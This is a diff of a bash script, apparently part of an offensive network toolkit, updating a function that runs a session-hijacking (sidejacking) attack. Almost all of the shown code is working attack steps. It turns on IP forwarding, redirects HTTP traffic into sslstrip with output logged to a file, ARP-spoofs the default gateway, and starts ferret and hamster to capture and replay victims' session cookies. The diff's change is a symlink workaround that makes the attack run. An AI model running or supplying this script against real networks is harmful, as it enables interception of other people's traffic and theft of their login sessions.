@@ -9,7 +9,7 @@
 #
 ##############################################
 clear
-version="20130422"
+version="20130426"
 #some variables
 DEFAULT_ROUTE=$(ip route show default | awk '/default/ {print $3}')
 IFACE=$(ip route show | awk '(NR == 2) {print $3}')
@@ -524,38 +524,48 @@ function pwnstar {
 
 ### Hunting with rodents hamster and ferret
 function hamfer {
-	echo -e "\033[31m[+] Starting Sidejacking with Hamster & Ferret.\033[m"
-	echo "1" > /proc/sys/net/ipv4/ip_forward
-	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
-	sslstrip -f -a -k -l 1000 -w /root/out.txt &
-	sleep 4
-	xterm -geometry 90x3-1-1 -T "arpspoof" -e arpspoof -i $IFACE $DEFAULT_ROUTE &
-	sleep 2
-	xterm -e ferret -i $IFACE 2>/dev/null & sleep 2
-	xterm -e hamster 2>/dev/null & sleep 2 
-	echo -e "\n\033[31m[+] Attack is running\033[m.\nSet browser proxy to 127.0.0.1:1234\nIn Browser go to http://hamster\nPress (q) to stop"
-	while read -n1 char
-	do
-		case $char in
-			q)
+		if [ ! -e "/usr/share/hamster-sidejack/ferret" ];then
+			echo -e "\033[31m[+] Creating link /usr/share/hamster-sidejack/ferret\033[m"
+			echo "we need this to avoid file not found error"
+			ln -s /usr/bin/ferret /usr/share/hamster-sidejack/ferret
+			hamfer			
+		else
+			echo -e "\033[31m[+] Starting Sidejacking with Hamster & Ferret.\033[m"
+			echo "1" > /proc/sys/net/ipv4/ip_forward
+			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
+			sslstrip -f -a -k -l 1000 -w /root/out.txt &
+			sleep 4
+			xterm -geometry 90x3-1-1 -T "arpspoof" -e arpspoof -i $IFACE $DEFAULT_ROUTE &
+			sleep 2
+			#xterm -e /usr/share/hamster-sidejack/ferret -i $IFACE 2>/dev/null & sleep 2
+			cd /usr/share/hamster-sidejack
+			xterm -e ./hamster 2>/dev/null & sleep 2 
+			echo -e "\n\033[31m[+] Attack is running\033[m.\nSet browser proxy to 127.0.0.1:1234\nIn Browser go to http://hamster\nPress (q) to stop"
+			cd
+			while read -n1 char
+			do
+				case $char in
+				q)
 				break
 				;;
 			
-			* )
-				echo -ne "\nInvalid character '$char' entered. Press (q) to quit."
-		esac
-	done
-	echo -e "\033[31m\n[+] Killing processes and resetting iptable.\033[m"
-	killall sslstrip
-	killall arpspoof
-	killall ferret
-	killall hamster
-	echo "0" > /proc/sys/net/ipv4/ip_forward
-	iptables --flush
-	iptables --table nat --flush
-	iptables --delete-chain
-	iptables --table nat --delete-chain
-	echo -e "\033[32m[-] Clean up successful !\033[m"
+				* )
+					echo -ne "\nInvalid character '$char' entered. Press (q) to quit."
+				esac
+			done
+			echo -e "\033[31m\n[+] Killing processes and resetting iptable.\033[m"
+			killall sslstrip
+			killall arpspoof
+			killall ferret
+			killall hamster
+			echo "0" > /proc/sys/net/ipv4/ip_forward
+			iptables --flush
+			iptables --table nat --flush
+			iptables --delete-chain
+			iptables --table nat --delete-chain
+			echo -e "\033[32m[-] Clean up successful !\033[m"
+	
+		fi	
 
 }
 
